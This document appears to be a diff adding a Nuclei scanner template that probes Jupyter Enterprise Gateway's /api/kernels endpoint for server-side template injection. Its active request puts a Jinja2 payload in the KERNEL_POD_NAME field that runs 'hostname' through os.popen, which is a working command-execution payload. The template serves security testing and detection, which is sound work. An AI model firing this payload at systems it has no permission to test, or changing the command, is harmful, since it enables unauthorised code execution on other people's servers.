@@ -1,0 +1,48 @@
+id: jupyter-enterprise-gateway-ssti
+info:
+  name: Jupyter Enterprise Gateway SSTI
+  author: berney
+  severity: info
+
+http:
+  #- id: ssti
+  #  method: POST
+  #  path:
+  #    - "{{BaseURL}}/api/kernels"
+  #  # Simple payload like `{{ 7 * 7 }}` doesn't get interpolated by nuclei and is sent raw
+  #  body: |
+  #    {
+  #      "env": {
+  #        "KERNEL_POD_NAME": "bdawg-ssti-{{ 7 * 7 }}",
+  #        "KERNEL_NAMESPACE": "notebooks"
+  #      }
+  #    }
+  #  matchers:
+  #    - type: status
+  #      status:
+  #        - 201
+
+
+  - id: ssti-hostname
+    method: POST
+    path:
+      - "{{BaseURL}}/api/kernels"
+    # Use unicode escapes \u007b `{` and \u007d `}` to send `{{` and `}}`
+    # So, that Nuclei won't interpret them and try to interpolate.
+    body: |
+      {
+        "env": {
+          "KERNEL_POD_NAME": "bdawg-ssti-\u007b\u007b cycler.__init__.__globals__.os.popen(\"hostname\").read() \u007d\u007d",
+          "KERNEL_NAMESPACE": "notebooks"
+        }
+      }
+    matchers:
+      - type: status
+        status:
+          - 201
+    extractors:
+      - type: json
+        part: body
+        name: id
+        json:
+          - .id
